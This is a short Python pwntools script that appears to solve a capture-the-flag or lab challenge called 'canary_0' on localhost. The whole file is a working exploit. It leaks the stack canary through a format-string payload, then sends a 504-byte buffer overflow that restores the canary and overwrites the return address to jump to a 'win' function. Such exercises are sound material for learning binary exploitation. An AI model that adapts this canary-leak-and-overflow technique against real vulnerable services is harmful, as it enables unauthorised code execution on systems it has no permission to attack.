from pwn import *

#x86_64, Linux, Little Endian
context.os = "linux"
context.endian = "little"
context.arch = "amd64"

elf = ELF("../canary_0", checksec=False)
win = elf.symbols["win"]

host = "localhost"
port = 10000

with remote(host, port) as conn:
    payload = b"%69$p" # 5 for the registers, + 512 / 8 ==> 5 + 64 = 69
    conn.sendline(payload)
    canary = conn.recv(18) # 0x + ascii canary = 18 bytes
    canary = int(canary, 16)
    print(hex(canary))

with remote(host, port) as conn:
    payload = b"A" * 504
    payload += p64(canary)
    payload += p64(0)
    payload += p64(win)
    conn.sendline(payload)
    print(conn.recvuntil("You win !!!").decode())